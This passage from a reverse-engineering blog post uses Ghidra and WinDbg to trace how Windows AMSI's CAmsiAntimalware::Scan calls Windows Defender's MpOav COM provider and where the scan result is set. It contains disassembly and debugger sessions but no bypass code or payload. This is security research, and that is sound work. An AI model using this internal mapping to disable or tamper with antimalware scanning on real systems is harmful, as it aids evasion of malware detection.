&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/CSharpLoader/ghidra_antimalware_lab_58fd.png&#34; alt=&#34;LAB_7ff9455058fd&#34;&gt;
this simply checks if &lt;code&gt;this-&amp;gt;0x1c0&lt;/code&gt; is null, if it is, it jumps to label &lt;code&gt;LAB_7ff94550590e&lt;/code&gt; else, it
continues exection from address &lt;code&gt;0x7ffxxxxx5906&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;block starting at &lt;code&gt;0x7ffxxxxx5906&lt;/code&gt; basically checks if &lt;code&gt;R14&lt;/code&gt; is null. it sets &lt;code&gt;bl&lt;/code&gt; if previous comparison
has caused sign flag to be 1. The operation may look like this in pseudocode.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-ps1&#34; data-lang=&#34;ps1&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    bl = (r14 &amp;lt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) + &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;as you can see in the above control flow graph, code is finally directed towards &lt;code&gt;LAB_7ff94550590e&lt;/code&gt;. What
this snippet does is,
call &lt;code&gt;CAmsiAntimalware::GenerateEtwEvent&lt;/code&gt; method. it passes &lt;code&gt;this&lt;/code&gt; and &lt;code&gt;amsiStream&lt;/code&gt; and &lt;code&gt;bl&lt;/code&gt; through &lt;code&gt;rcx&lt;/code&gt;,
&lt;code&gt;rdx&lt;/code&gt; and &lt;code&gt;r9&lt;/code&gt; registers as first three arguments. fourth and the last one is passed through &lt;code&gt;r9&lt;/code&gt; and this
is basically the &lt;code&gt;AMSI_RESULT&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Now Im going to find where &lt;code&gt;AMSI_RESULT&lt;/code&gt; is being modified. We already know &lt;code&gt;rdi&lt;/code&gt; is a pointer to the enum.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/CSharpLoader/ghidra_antimalware_57fe.png&#34; alt=&#34;7ff9455057fe&#34;&gt;&lt;/p&gt;
&lt;p&gt;In the above snippet, &lt;code&gt;rdi&lt;/code&gt; (result) is assigned to value of &lt;code&gt;eax&lt;/code&gt;. if we go up in the control flow, we can
see &lt;code&gt;eax&lt;/code&gt; is assigned
with &lt;code&gt;local_108&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Now we know some interesting places to place breakpoints and analyze, it is time to get into a windbg session.&lt;/p&gt;
&lt;p&gt;First, Im gonna place a break point at address at place where &lt;code&gt;provider&lt;/code&gt; is checked.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-ps1&#34; data-lang=&#34;ps1&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;018&lt;/span&gt;&amp;gt; bp 0x7ffxxxxx5654
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0.018&lt;/span&gt;&amp;gt; g
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[...]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0.018&lt;/span&gt;&amp;gt; r r9
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;r9=&lt;span style=&#34;color:#ae81ff&#34;&gt;0000000000000000&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;As it is clear from the above snippet, &lt;code&gt;r9&lt;/code&gt; register which holds a pointer to a pointer of &lt;code&gt;IAntimalwareProvider&lt;/code&gt; class is set to zero.
We saw this earlier in &lt;code&gt;AmsiScanBuffer&lt;/code&gt; function.&lt;/p&gt;
&lt;p&gt;Even if some value is passed down through this register, &lt;code&gt;CAmsiAntimalware::Scan&lt;/code&gt; will set it to zero.&lt;/p&gt;
&lt;p&gt;the next important piece for us is where &lt;code&gt;this&lt;/code&gt; is being accessed.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/CSharpLoader/windbg_amsiantimalaware_01c0.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;above diagram shows exection has been stopped just after the instruction where function accessess &lt;code&gt;this-&amp;gt;0x1c0&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;And the value at that address is set to 0x1. This gives us a hint that this member
might be numerical value rather than a pointer.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/CSharpLoader/windbg_amsiantimalware_random_number.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;A little below that, we can the random number generated by &lt;code&gt;rand()&lt;/code&gt; being stored in
&lt;code&gt;ecx&lt;/code&gt; register and that value is &lt;code&gt;0x2ea6&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Since we already know what this snippet does, we can perform the calculation by ourself.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; hex(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x2ea6&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x64&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;0x2a&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/CSharpLoader/windbg_amsiantimalware_set_ecx.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;Above diagram conludes that.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/CSharpLoader/windbg_amsiantimalware_0x40.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;Above diagram shows where the function retreives address of &lt;code&gt;this-&amp;gt;0x40&lt;/code&gt; into &lt;code&gt;r14&lt;/code&gt; register.&lt;/p&gt;
&lt;p&gt;When &lt;code&gt;this-&amp;gt;0x40&lt;/code&gt; is printed, it also looks like an address that
pointed at heap.&lt;/p&gt;
&lt;p&gt;Value at &lt;code&gt;*this-&amp;gt;0x40&lt;/code&gt; looks like a function pointer and when disasseble that
address, windbg prints disassembly of &lt;code&gt;MpOav!DllRegisterServer&lt;/code&gt; (another dll ? we&amp;rsquo;ll see)but disassembly
starts from the middle of the function. This might not be a function pointer after all.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/CSharpLoader/windbg_amsiantimalware_0xc0.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;here is another place where a member of &lt;code&gt;CAmsiAntimalware&lt;/code&gt; class has been referenced.
this time as we&amp;rsquo;ve discussed when doing static analysis, stores address &lt;code&gt;this-&amp;gt;0xc0&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;It doesnt provide us with imformation about type of data even if we take a look at the data at that address,&lt;/p&gt;
&lt;h4 id=&#34;control-flow-path-1-continued&#34;&gt;Control flow path 1 continued&lt;/h4&gt;
&lt;p&gt;Now we are at the instruction in disassembly where that loop begins.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-ps1&#34; data-lang=&#34;ps1&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;00007fffae8356d2 488d4c2448           lea     rcx, [rsp+48h]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;00007fffae8356d7 895c2440             mov     dword ptr [rsp+40h], ebx
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;00007fffae8356db 48895c2448           mov     qword ptr [rsp+48h], rbx
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;00007fffae8356e0 ff15f2680000         call    qword ptr [amsi!_imp_GetSystemTimePreciseAsFileTime (00007fff`ae83bfd8)]
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We see that in the above image, first instruction loads address of &lt;code&gt;rsp+0x48&lt;/code&gt; into &lt;code&gt;rcx&lt;/code&gt;
register and calls &lt;code&gt;GetSystemTimePreciseAsFileTime&lt;/code&gt;, which is used to retrieve the current
system date and time with the highest possible level of precision in UTC format.&lt;/p&gt;
&lt;p&gt;before the call instruction it also initialize &lt;code&gt;rsp+0x40&lt;/code&gt; and &lt;code&gt;rsp+0x48&lt;/code&gt; with 0x0.&lt;/p&gt;
&lt;p&gt;Then value at address &lt;code&gt;r14&lt;/code&gt; gets stored in &lt;code&gt;rcx&lt;/code&gt; register. if you remember, &lt;code&gt;r14&lt;/code&gt; register stores &lt;code&gt;&amp;amp;this-&amp;gt;0x40&lt;/code&gt; so &lt;code&gt;rcx&lt;/code&gt; would be value of &lt;code&gt;this-&amp;gt;0x40&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Then can see some manipulations around that value.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/CSharpLoader/windbg_antimalware_call_dispatch.png&#34; alt=&#34;call com interface&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;mov    rax, qword ptr [rcx]&lt;/code&gt; stores value at &lt;code&gt;*this-&amp;gt;0x40&lt;/code&gt; in &lt;code&gt;rax&lt;/code&gt; register. Next instruction
takes 0x18 th offset of it and stores it back in &lt;code&gt;rax&lt;/code&gt; register. Then that address is called using a
&lt;code&gt;gaurd_dispatch_icall_fptr&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;With that information it is clear that &lt;code&gt;this-&amp;gt;0x40&lt;/code&gt; is a pointer to an object of an unknown class. &lt;code&gt;rcx&lt;/code&gt; now points to that object and &lt;code&gt;rax&lt;/code&gt; holds one of function pointers in the object&amp;rsquo;s
vftable. Well my guess is that this is the windows defender&amp;rsquo;s AMSI COM interface.&lt;/p&gt;
&lt;p&gt;The first argument passed to the function is  &lt;code&gt;this-&amp;gt;0x40&lt;/code&gt;.
Second, third and fourth are passed through &lt;code&gt;rdx&lt;/code&gt; and &lt;code&gt;r8&lt;/code&gt; registers. we can see that in the&lt;br&gt;
disassembly &lt;code&gt;rdx&lt;/code&gt; being set to &lt;code&gt;rsp+0x70&lt;/code&gt; (amsiBuffer) and &lt;code&gt;r8&lt;/code&gt; being initialized to the address of &lt;code&gt;rsp +0x40&lt;/code&gt; (who&amp;rsquo;s value is 0).&lt;/p&gt;
&lt;p&gt;Weird thing is, the function is jumping into the middle of a function.&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s try following it.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/CSharpLoader/windbg_mpoav_ret.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;Well this makes it bit clear. First of all we not jumping into the middle of a function, See that &lt;code&gt;ret&lt;/code&gt;
instruction up there? What this tells us is, we jumped into a function but it is not labelled correctly.&lt;/p&gt;
&lt;p&gt;However if you try to goto this address from a disassembler, it will fail. Indicating that this
a function from another dll.&lt;/p&gt;
&lt;p&gt;here&amp;rsquo;s the memory map.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/CSharpLoader/windbg_mpoav_memmap.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;See? It seems like this dll is the COM dll that implements &lt;code&gt;IAmsiAntimalware&lt;/code&gt; interface for
windows defender.&lt;/p&gt;
&lt;p&gt;To confirm that, let&amp;rsquo;s check the registry.&lt;/p&gt;
&lt;p&gt;// registry&lt;/p&gt;
&lt;p&gt;Now it is confirmed, let&amp;rsquo;s go through this function.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-asm&#34; data-lang=&#34;asm&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;MpOav&lt;/span&gt;!&lt;span style=&#34;color:#66d9ef&#34;&gt;DllRegisterServer&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x1060&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fffae7b37f0&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;48895&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;c2408&lt;/span&gt;      &lt;span style=&#34;color:#66d9ef&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;qword&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;ptr&lt;/span&gt; [&lt;span style=&#34;color:#66d9ef&#34;&gt;rsp&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;],&lt;span style=&#34;color:#66d9ef&#34;&gt;rbx&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fffae7b37f5&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;48896&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;c2410&lt;/span&gt;      &lt;span style=&#34;color:#66d9ef&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;qword&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;ptr&lt;/span&gt; [&lt;span style=&#34;color:#66d9ef&#34;&gt;rsp&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;h&lt;/span&gt;],&lt;span style=&#34;color:#66d9ef&#34;&gt;rbp&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fffae7b37fa&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4889742420&lt;/span&gt;      &lt;span style=&#34;color:#66d9ef&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;qword&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;ptr&lt;/span&gt; [&lt;span style=&#34;color:#66d9ef&#34;&gt;rsp&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;h&lt;/span&gt;],&lt;span style=&#34;color:#66d9ef&#34;&gt;rsi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fffae7b37ff&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;57&lt;/span&gt;              &lt;span style=&#34;color:#66d9ef&#34;&gt;push&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;rdi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fffae7b3800&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4156&lt;/span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;push&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;r14&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fffae7b3802&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4157&lt;/span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;push&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;r15&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fffae7b3804&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4883&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;ec20&lt;/span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;sub&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;rsp&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;h&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fffae7b3808&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;d8bf0&lt;/span&gt;          &lt;span style=&#34;color:#66d9ef&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;r14&lt;/span&gt;,&lt;span style=&#34;color:#66d9ef&#34;&gt;r8&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fffae7b380b&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;c8bfa&lt;/span&gt;          &lt;span style=&#34;color:#66d9ef&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;r15&lt;/span&gt;,&lt;span style=&#34;color:#66d9ef&#34;&gt;rdx&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fffae7b380e&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;488&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;bf1&lt;/span&gt;          &lt;span style=&#34;color:#66d9ef&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;rsi&lt;/span&gt;,&lt;span style=&#34;color:#66d9ef&#34;&gt;rcx&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fffae7b3811&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;d85c0&lt;/span&gt;          &lt;span style=&#34;color:#66d9ef&#34;&gt;test&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;r8&lt;/span&gt;,&lt;span style=&#34;color:#66d9ef&#34;&gt;r8&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fffae7b3814&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;750&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;a&lt;/span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;jne&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;MpOav&lt;/span&gt;!&lt;span style=&#34;color:#66d9ef&#34;&gt;DllRegisterServer&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x1090&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;fffae7b3820&lt;/span&gt;) 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;MpOav&lt;/span&gt;!&lt;span style=&#34;color:#66d9ef&#34;&gt;DllRegisterServer&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x1086&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fffae7b3816&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;b857000780&lt;/span&gt;      &lt;span style=&#34;color:#66d9ef&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;eax&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;80070057&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;h&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fffae7b381b&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;e96e010000&lt;/span&gt;      &lt;span style=&#34;color:#66d9ef&#34;&gt;jmp&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;MpOav&lt;/span&gt;!&lt;span style=&#34;color:#66d9ef&#34;&gt;DllRegisterServer&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x11fe&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;fffae7b398e&lt;/span&gt;) 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;First it does some work on the stack frame and moves &lt;code&gt;0x80070057&lt;/code&gt; to &lt;code&gt;rax&lt;/code&gt; register if third parameter is null
(pointer to a stack variable of CAmsiAntimalware::Scan method), And we know this is &lt;code&gt;E_INVALIDARG&lt;/code&gt;. And then
function jumps to the epilogue. So this is basically a small sanity check.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-asm&#34; data-lang=&#34;asm&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fffae7b3820&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;41&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;c70001000000&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;dword&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;ptr&lt;/span&gt; [&lt;span style=&#34;color:#66d9ef&#34;&gt;r8&lt;/span&gt;], &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;ds&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;000000931&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;c9ce770&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;00000000&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;00007&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fffae7b3827&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;80&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;b9c800000000&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;cmp&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;ptr&lt;/span&gt; [&lt;span style=&#34;color:#66d9ef&#34;&gt;rcx&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;C8h&lt;/span&gt;], &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;ds&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;00000250&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;a33025d8&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;00&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;then it moves 1 or &lt;code&gt;AMSI_RESULT_NOT_DETECTED&lt;/code&gt; into third parameter and checks if first parameter (rcx) + 200 is 0.
We know that first parameter (rcx) passed down to this function is &lt;code&gt;CAmsiAntimalware-&amp;gt;0x40&lt;/code&gt;. (yes doesnt make
much sense.)&lt;/p&gt;
